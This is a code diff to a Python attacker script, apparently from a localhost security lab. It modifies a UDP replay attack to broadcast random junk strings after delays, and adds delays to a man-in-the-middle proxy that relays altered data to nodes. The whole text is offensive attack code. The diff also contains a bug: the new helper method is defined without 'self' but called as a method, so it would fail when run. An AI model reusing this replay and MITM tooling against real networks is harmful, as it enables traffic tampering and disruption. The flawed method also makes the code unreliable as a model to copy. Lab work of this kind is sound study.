@@ -4,6 +4,9 @@ import socket
 import threading
 import argparse
 import pickle
+import random
+import string
+import time
 
 MITM_IP = '127.0.0.1'
 MITM_PORT = 55555
@@ -17,7 +20,14 @@ class Attacker:
         self.tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.tcp_socket.connect((self.server_ip, self.server_port))
         self.udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-                    
+        
+    def generate_random_string(length):
+        # Choose from lowercase letters and digits
+        characters = string.ascii_lowercase + string.digits
+        # Generate a random string of the specified length
+        random_string = ''.join(random.choice(characters) for _ in range(length))
+        return random_string   
+                
     def perform_replay_attack(self):
         sock = self.udp_socket
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
@@ -27,7 +37,9 @@ class Attacker:
             data, _ = sock.recvfrom(1024)
             message = data.decode()
             print(f"received message: {message}")
-            sock.sendto(message.encode(), ('<broadcast>', self.udp_port))
+            modified_message = self.generate_random_string(134)
+            time.sleep(5)
+            sock.sendto(modified_message.encode(), ('<broadcast>', self.udp_port))
     
     def run_replay_attack(self):
         self.perform_replay_attack()
@@ -65,7 +77,8 @@ class Attacker:
                 # Send the modified data to the client (node)
                 client_socket.send(modified_data)
                 print(f"Sent to client: {modified_data}")
-
+            time.sleep(5)
+            
     def start_mitm(self):
         # Create a socket to listen for incoming connections from nodes
         mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -98,4 +111,3 @@ if __name__ == '__main__':
     elif args.attack_type == 'MiTM':
         attacker = Attacker("127.0.0.1", 55000)
         attacker.start_mitm()
-            
